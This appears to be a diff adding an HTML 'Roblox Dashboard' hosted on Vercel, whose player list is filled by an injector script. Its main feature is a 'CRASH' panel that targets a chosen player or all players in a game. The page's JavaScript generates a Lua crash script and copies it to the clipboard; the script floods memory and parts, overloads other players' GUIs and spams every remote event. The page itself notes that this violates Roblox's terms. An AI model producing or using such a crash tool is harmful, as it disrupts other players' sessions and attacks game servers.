@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Cards */
+        .card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 24px;
+        }
+
+        .card-title {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #666;
+            margin-bottom: 16px;
+        }
+
+        /* Profile */
+        .profile-avatar {
+            width: 100%;
+            aspect-ratio: 1/1;
+            border-radius: 12px;
+            object-fit: cover;
+            background: #1a1a1a;
+            border: 2px solid #2a2a2a;
+            margin-bottom: 16px;
+        }
+
+        .profile-name {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .profile-display {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 4px;
+        }
+
+        .profile-id {
+            font-size: 13px;
+            color: #555;
+            font-family: monospace;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 12px;
+        }
+
+        .status-badge.online {
+            background: #00c853;
+            color: #000;
+        }
+
+        .status-badge.offline {
+            background: #555;
+            color: #aaa;
+        }
+
+        .status-badge.crashed {
+            background: #d50000;
+            color: #fff;
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #2a2a2a;
+        }
+
+        .stat {
+            text-align: center;
+            padding: 8px;
+            background: #1a1a1a;
+            border-radius: 8px;
+        }
+
+        .stat .num {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .stat .num.blue { color: #448aff; }
+        .stat .num.green { color: #00c853; }
+        .stat .num.red { color: #d50000; }
+
+        .stat .label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        /* Player List */
+        .player-list {
+            max-height: 400px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .player-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .player-item:hover {
+            border-color: #3a3a3a;
+            background: #1f1f1f;
+        }
+
+        .player-item.selected {
+            border-color: #448aff;
+            background: rgba(68, 138, 255, 0.08);
+        }
+
+        .player-item .info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+            min-width: 0;
+        }
+
+        .player-item .avatar-small {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            object-fit: cover;
+            background: #0a0a0a;
+            flex-shrink: 0;
+        }
+
+        .player-item .name {
+            font-size: 14px;
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .player-item .badge {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            background: #0a0a0a;
+            color: #666;
+            flex-shrink: 0;
+        }
+
+        .player-item .badge.self {
+            color: #448aff;
+            border: 1px solid #448aff;
+        }
+
+        .player-item .badge.target {
+            color: #d50000;
+            border: 1px solid #d50000;
+        }
+
+        .player-item .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00c853;
+            flex-shrink: 0;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 30px 20px;
+            color: #555;
+        }
+
+        .empty-state .emoji {
+            font-size: 32px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        /* Controls */
+        .controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .btn {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn-primary {
+            background: #448aff;
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #2979ff;
+        }
+
+        .btn-danger {
+            background: #d50000;
+            color: #fff;
+        }
+
+        .btn-danger:hover {
+            background: #b71c1c;
+        }
+
+        .btn-danger:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #2a2a2a;
+            color: #888;
+        }
+
+        .btn-outline:hover {
+            border-color: #444;
+            color: #fff;
+        }
+
+        /* Crash Section */
+        .crash-section {
+            margin-top: 12px;
+            padding: 16px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .crash-section .warning {
+            font-size: 11px;
+            color: #666;
+            padding: 6px 12px;
+            background: rgba(213, 0, 0, 0.06);
+            border-radius: 6px;
+            margin-bottom: 12px;
+        }
+
+        .crash-intensity {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 10px 0;
+        }
+
+        .crash-intensity label {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .crash-intensity input[type="range"] {
+            flex: 1;
+            height: 4px;
+            -webkit-appearance: none;
+            background: #2a2a2a;
+            border-radius: 2px;
+            outline: none;
+        }
+
+        .crash-intensity input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #d50000;
+            cursor: pointer;
+        }
+
+        .crash-intensity .value {
+            font-size: 14px;
+            font-weight: 700;
+            color: #d50000;
+            min-width: 24px;
+            text-align: center;
+        }
+
+        .crash-options {
+            display: flex;
+            gap: 16px;
+            margin: 10px 0;
+            flex-wrap: wrap;
+        }
+
+        .crash-options label {
+            font-size: 12px;
+            color: #888;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .crash-options input[type="checkbox"] {
+            accent-color: #d50000;
+            cursor: pointer;
+        }
+
+        .target-display {
+            font-size: 13px;
+            color: #d50000;
+            font-weight: 600;
+            padding: 6px 12px;
+            background: rgba(213, 0, 0, 0.06);
+            border-radius: 6px;
+            margin-bottom: 10px;
+            min-height: 32px;
+        }
+
+        /* Console */
+        .console {
+            margin-top: 12px;
+            background: #0a0a0a;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.8;
+            border: 1px solid #1a1a1a;
+        }
+
+        .console .line {
+            opacity: 0.9;
+        }
+
+        .console .line .time {
+            color: #444;
+            margin-right: 10px;
+        }
+
+        .console .line.info { color: #888; }
+        .console .line.success { color: #00c853; }
+        .console .line.error { color: #d50000; }
+        .console .line.warning { color: #ffab00; }
+        .console .line.system { color: #448aff; }
+
+        .text-muted { color: #666; }
+        .text-sm { font-size: 12px; }
+        .mt-8 { margin-top: 8px; }
+        .mb-8 { margin-bottom: 8px; }
+        .flex { display: flex; align-items: center; gap: 8px; }
+
+        .vercel-badge {
+            margin-top: 16px;
+            padding: 8px 12px;
+            background: #1a1a1a;
+            border-radius: 6px;
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+        }
+
+        .vercel-badge a {
+            color: #448aff;
+            text-decoration: none;
+        }
+
+        .vercel-badge a:hover {
+            text-decoration: underline;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2a2a2a;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- LEFT: PROFILE -->
+    <div class="card">
+        <img class="profile-avatar" id="avatar" 
+             src="https://www.roblox.com/headshot-thumbnail/image?userId=0&width=420&height=420&format=png"
+             alt="avatar">
+        <div class="profile-name" id="profileName">Guest</div>
+        <div class="profile-display" id="profileDisplay">Guest</div>
+        <div class="profile-id" id="profileId">ID: 0</div>
+        <div class="status-badge offline" id="statusBadge">● Offline</div>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="num blue" id="statPlayers">0</div>
+                <div class="label">Players</div>
+            </div>
+            <div class="stat">
+                <div class="num green" id="statCrashes">0</div>
+                <div class="label">Crashes</div>
+            </div>
+            <div class="stat">
+                <div class="num" id="statUptime">0s</div>
+                <div class="label">Uptime</div>
+            </div>
+        </div>
+
+        <div class="text-muted text-sm" style="margin-top: 12px; text-align: center;" id="lastUpdate">
+            Last update: Never
+        </div>
+
+        <div class="vercel-badge">
+            🚀 Hosted on <a href="#" id="vercelLink" target="_blank">Vercel</a>
+        </div>
+    </div>
+
+    <!-- RIGHT: MAIN -->
+    <div>
+
+        <!-- PLAYER LIST -->
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span class="card-title">👥 Players</span>
+                <span class="text-muted text-sm" id="playerCount">0 online</span>
+            </div>
+
+            <div class="player-list" id="playerList">
+                <div class="empty-state">
+                    <span class="emoji">🔌</span>
+                    <div>No players connected</div>
+                    <div class="text-sm" style="margin-top: 4px;">Run injector script to populate</div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh</button>
+                <button class="btn btn-outline" onclick="clearSelection()">✕ Clear</button>
+            </div>
+        </div>
+
+        <!-- CONTROLS + CRASH -->
+        <div class="card" style="margin-top: 20px;">
+            <span class="card-title">🎯 Controls</span>
+
+            <div class="target-display" id="targetDisplay">No target selected</div>
+
+            <div class="crash-section">
+                <div class="warning">⚠️ Use responsibly. Crashing violates Roblox ToS.</div>
+
+                <div class="crash-intensity">
+                    <label>Intensity</label>
+                    <input type="range" id="crashIntensity" min="1" max="10" value="5">
+                    <span class="value" id="intensityDisplay">5</span>
+                </div>
+
+                <div class="crash-options">
+                    <label>
+                        <input type="checkbox" id="crashAll">
+                        Crash All
+                    </label>
+                    <label>
+                        <input type="checkbox" id="crashSpecific" checked>
+                        Target Specific
+                    </label>
+                    <label>
+                        <input type="checkbox" id="crashSelf">
+                        Include Self
+                    </label>
+                </div>
+
+                <div class="controls" style="margin-top: 8px;">
+                    <button class="btn btn-danger" id="btnCrash" onclick="executeCrash()">
+                        💀 CRASH
+                    </button>
+                    <button class="btn btn-outline" onclick="stopCrash()">
+                        ⏹ Stop
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- CONSOLE -->
+        <div class="card" style="margin-top: 20px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span class="card-title">⎚ Console</span>
+                <button class="btn btn-outline" style="padding: 4px 12px; font-size: 11px;" onclick="clearConsole()">Clear</button>
+            </div>
+            <div class="console" id="console"></div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ============================================
+// CONFIGURATION - CHANGE THIS!
+// ============================================
+// Get the current URL dynamically
+const API_URL = window.location.origin + '/api/profile';
+
+// ============================================
+// STATE
+// ============================================
+const state = {
+    players: [
+        // Add some demo players or they'll appear from injector
+    ],
+    selectedPlayer: null,
+    crashes: 0,
+    startTime: Date.now(),
+    profile: {
+        username: 'Guest',
+        userId: 0,
+        displayName: 'Guest',
+        avatar: 'https://www.roblox.com/headshot-thumbnail/image?userId=0&width=420&height=420&format=png'
+    }
+};
+
+// ============================================
+// DOM REFS
+// ============================================
+const $ = id => document.getElementById(id);
+const dom = {
+    avatar: $('avatar'),
+    profileName: $('profileName'),
+    profileDisplay: $('profileDisplay'),
+    profileId: $('profileId'),
+    statusBadge: $('statusBadge'),
+    statPlayers: $('statPlayers'),
+    statCrashes: $('statCrashes'),
+    statUptime: $('statUptime'),
+    lastUpdate: $('lastUpdate'),
+    playerList: $('playerList'),
+    playerCount: $('playerCount'),
+    targetDisplay: $('targetDisplay'),
+    console: $('console'),
+    crashIntensity: $('crashIntensity'),
+    intensityDisplay: $('intensityDisplay'),
+    crashAll: $('crashAll'),
+    crashSpecific: $('crashSpecific'),
+    crashSelf: $('crashSelf'),
+    btnCrash: $('btnCrash'),
+    vercelLink: $('vercelLink'),
+};
+
+// Update Vercel link
+dom.vercelLink.href = window.location.origin;
+
+// ============================================
+// CONSOLE
+// ============================================
+function log(message, type = 'info') {
+    const line = document.createElement('div');
+    line.className = `line ${type}`;
+    const time = new Date().toLocaleTimeString();
+    line.innerHTML = `<span class="time">[${time}]</span> ${message}`;
+    dom.console.appendChild(line);
+    dom.console.scrollTop = dom.console.scrollHeight;
+}
+
+function clearConsole() {
+    dom.console.innerHTML = '';
+    log('Console cleared', 'system');
+}
+
+// ============================================
+// FETCH DATA
+// ============================================
+async function fetchProfile() {
+    try {
+        const res = await fetch(API_URL);
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data && data.username && data.username !== 'Guest') {
+            state.profile = data;
+            updateProfileUI(data);
+            // Add player to list if not already there
+            if (!state.players.find(p => p.userId === data.userId)) {
+                state.players.push({
+                    userId: data.userId,
+                    username: data.username,
+                    displayName: data.displayName,
+                    avatar: data.avatar
+                });
+                renderPlayerList();
+                dom.statPlayers.textContent = state.players.length;
+                dom.playerCount.textContent = `${state.players.length} online`;
+            }
+        }
+    } catch (e) {
+        // Silent fail
+    }
+}
+
+// ============================================
+// PROFILE UI
+// ============================================
+function updateProfileUI(data) {
+    dom.profileName.textContent = data.username;
+    dom.profileDisplay.textContent = data.displayName || data.username;
+    dom.profileId.textContent = `ID: ${data.userId}`;
+    dom.avatar.src = data.avatar || 
+        `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png`;
+    dom.statusBadge.className = 'status-badge online';
+    dom.statusBadge.textContent = '● Online';
+    dom.lastUpdate.textContent = `Last update: ${new Date().toLocaleTimeString()}`;
+}
+
+// ============================================
+// PLAYER LIST UI
+// ============================================
+function renderPlayerList() {
+    const container = dom.playerList;
+    if (state.players.length === 0) {
+        container.innerHTML = `
+            <div class="empty-state">
+                <span class="emoji">🔌</span>
+                <div>No players connected</div>
+                <div class="text-sm" style="margin-top: 4px;">Run injector script to populate</div>
+            </div>
+        `;
+        return;
+    }
+
+    container.innerHTML = state.players.map(p => {
+        const isSelected = state.selectedPlayer && state.selectedPlayer.userId === p.userId;
+        const isSelf = p.userId === state.profile.userId && state.profile.userId !== 0;
+        return `
+            <div class="player-item ${isSelected ? 'selected' : ''}" onclick="selectPlayer(${p.userId})">
+                <div class="info">
+                    <img class="avatar-small" src="${p.avatar || 'https://www.roblox.com/headshot-thumbnail/image?userId=' + p.userId + '&width=100&height=100&format=png'}" 
+                         onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=0&width=100&height=100&format=png'">
+                    <span class="name">${p.displayName || p.username}</span>
+                    ${isSelf ? '<span class="badge self">you</span>' : ''}
+                    ${isSelected && !isSelf ? '<span class="badge target">target</span>' : ''}
+                </div>
+                <span class="dot"></span>
+            </div>
+        `;
+    }).join('');
+}
+
+// ============================================
+// PLAYER SELECTION
+// ============================================
+function selectPlayer(userId) {
+    const player = state.players.find(p => p.userId === userId);
+    if (!player) return;
+
+    if (state.selectedPlayer && state.selectedPlayer.userId === userId) {
+        state.selectedPlayer = null;
+        dom.targetDisplay.textContent = 'No target selected';
+        dom.targetDisplay.style.color = '#888';
+        renderPlayerList();
+        return;
+    }
+
+    state.selectedPlayer = player;
+    dom.targetDisplay.textContent = `🎯 ${player.displayName || player.username} (${player.userId})`;
+    dom.targetDisplay.style.color = '#d50000';
+    renderPlayerList();
+    log(`🎯 Selected: ${player.username}`, 'system');
+}
+
+function clearSelection() {
+    state.selectedPlayer = null;
+    dom.targetDisplay.textContent = 'No target selected';
+    dom.targetDisplay.style.color = '#888';
+    renderPlayerList();
+}
+
+function refreshData() {
+    fetchProfile();
+    log('🔄 Data refreshed', 'info');
+}
+
+// ============================================
+// 💀 CRASH
+// ============================================
+function executeCrash() {
+    const intensity = parseInt(dom.crashIntensity.value);
+    const crashAll = dom.crashAll.checked;
+    const crashSpecific = dom.crashSpecific.checked;
+    const crashSelf = dom.crashSelf.checked;
+    const target = state.selectedPlayer;
+
+    // Validation
+    if (!crashAll && !crashSpecific) {
+        log('⚠️ No target selected', 'warning');
+        return;
+    }
+
+    if (crashSpecific && !target) {
+        log('⚠️ Select a player first', 'warning');
+        return;
+    }
+
+    if (crashSpecific && target && target.userId === state.profile.userId && !crashSelf) {
+        log('⚠️ Cannot crash yourself (enable "Include Self")', 'warning');
+        return;
+    }
+
+    // Log crash
+    state.crashes++;
+    dom.statCrashes.textContent = state.crashes;
+
+    const targetName = crashAll ? 'ALL PLAYERS' : `@${target.username}`;
+    log(`💀 CRASH EXECUTED | ${targetName} | Intensity: ${intensity}/10`, 'error');
+
+    // Visual feedback
+    dom.statusBadge.className = 'status-badge crashed';
+    dom.statusBadge.textContent = '💀 CRASHED';
+    dom.btnCrash.disabled = true;
+    dom.btnCrash.textContent = '💀 CRASHING...';
+
+    // Generate and copy crash script
+    const script = generateCrashScript(intensity, crashAll, target, crashSelf);
+    
+    navigator.clipboard.writeText(script).then(() => {
+        log('📋 Crash script copied to clipboard', 'success');
+    }).catch(() => {
+        // Fallback
+        const textarea = document.createElement('textarea');
+        textarea.value = script;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        log('📋 Crash script copied (fallback)', 'success');
+    });
+
+    // Flash effect
+    const flash = document.createElement('div');
+    flash.style.cssText = 'position:fixed;inset:0;background:rgba(255,0,0,0.15);pointer-events:none;z-index:999;transition:opacity 0.1s;';
+    document.body.appendChild(flash);
+    setTimeout(() => { flash.style.opacity = '0'; setTimeout(() => flash.remove(), 200); }, 200);
+
+    // Reset
+    setTimeout(() => {
+        dom.btnCrash.disabled = false;
+        dom.btnCrash.textContent = '💀 CRASH';
+        if (state.profile.userId !== 0) {
+            dom.statusBadge.className = 'status-badge online';
+            dom.statusBadge.textContent = '● Online';
+        }
+    }, 4000);
+}
+
+function generateCrashScript(intensity, crashAll, target, crashSelf) {
+    const targetId = target ? target.userId : 0;
+    const targetName = target ? target.username : 'all';
+
+    return `-- 💀 CRASH SCRIPT
+-- Generated from Dashboard
+-- Intensity: ${intensity}/10
+-- Target: ${crashAll ? 'ALL' : targetName}
+
+local intensity = ${intensity}
+local crashAll = ${crashAll}
+local targetId = ${targetId}
+local crashSelf = ${crashSelf}
+
+-- Memory Flood
+local function memFlood()
+    local mem = {}
+    for i = 1, intensity * 500 do
+        mem[i] = string.rep("X", 1000000)
+    end
+end
+
+-- Instance Flood
+local function instFlood()
+    for i = 1, intensity * 300 do
+        local p = Instance.new("Part")
+        p.Size = Vector3.new(100, 100, 100)
+        p.Position = Vector3.new(math.random(-5000,5000), math.random(-5000,5000), math.random(-5000,5000))
+        p.Anchored = true
+        p.Parent = workspace
+    end
+end
+
+-- GUI Overload
+local function guiOverload()
+    local players = game:GetService("Players"):GetPlayers()
+    local targets = {}
+    if crashAll then
+        targets = players
+    else
+        for _, p in pairs(players) do
+            if p.UserId == targetId then
+                table.insert(targets, p)
+            end
+        end
+        if not crashSelf then
+            local self = game:GetService("Players").LocalPlayer
+            for i, p in pairs(targets) do
+                if p.UserId == self.UserId then table.remove(targets, i) break end
+            end
+        end
+    end
+    for _, plr in pairs(targets) do
+        local gui = Instance.new("ScreenGui")
+        gui.Parent = plr.PlayerGui
+        for i = 1, intensity * 100 do
+            local f = Instance.new("Frame")
+            f.Size = UDim2.new(0, math.random(100,800), 0, math.random(100,800))
+            f.Position = UDim2.new(math.random(),0,math.random(),0)
+            f.BackgroundColor3 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
+            f.Parent = gui
+        end
+    end
+end
+
+-- Remote Spam
+local function remoteSpam()
+    local remotes = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            table.insert(remotes, v)
+        end
+    end
+    for i = 1, intensity * 20 do
+        for _, r in pairs(remotes) do
+            pcall(function()
+                if r:IsA("RemoteEvent") then r:FireServer() end
+                if r:IsA("RemoteFunction") then r:InvokeServer() end
+            end)
+        end
+        wait(0.001)
+    end
+end
+
+print("💀 CRASHING...")
+spawn(memFlood)
+spawn(instFlood)
+spawn(guiOverload)
+spawn(remoteSpam)
+print("💀 CRASH EXECUTED!")`;
+}
+
+function stopCrash() {
+    log('⏹ Crash stopped', 'warning');
+    dom.statusBadge.className = 'status-badge offline';
+    dom.statusBadge.textContent = '⛔ Stopped';
+    dom.btnCrash.disabled = false;
+    dom.btnCrash.textContent = '💀 CRASH';
+}
+
+// ============================================
+// INTENSITY SLIDER
+// ============================================
+dom.crashIntensity.addEventListener('input', function() {
+    dom.intensityDisplay.textContent = this.value;
+});
+
+// ============================================
+// AUTO REFRESH
+// ============================================
+setInterval(() => {
+    fetchProfile();
+    const uptime = Math.floor((Date.now() - state.startTime) / 1000);
+    const mins = Math.floor(uptime / 60);
+    const secs = uptime % 60;
+    dom.statUptime.textContent = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+}, 2000);
+
+// ============================================
+// KEYBOARD SHORTCUTS
+// ============================================
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && e.ctrlKey) {
+        e.preventDefault();
+        executeCrash();
+    }
+    if (e.key === 'Escape') {
+        clearSelection();
+    }
+    if (e.key === 'F5') {
+        e.preventDefault();
+        refreshData();
+    }
+});
+
+// ============================================
+// INIT
+// ============================================
+log('🚀 Dashboard initialized', 'system');
+log(`📡 API: ${API_URL}`, 'system');
+log('💡 Select a player and press Ctrl+Enter to crash', 'info');
+log('⌨️ F5 = Refresh | Escape = Clear selection', 'system');
+
+setTimeout(() => {
+    fetchProfile();
+}, 500);
+
+// Expose to console
+window.selectPlayer = selectPlayer;
+window.clearSelection = clearSelection;
+window.refreshData = refreshData;
+window.executeCrash = executeCrash;
+window.stopCrash = stopCrash;
+window.log = log;
+</script>
+</body>
+</html>
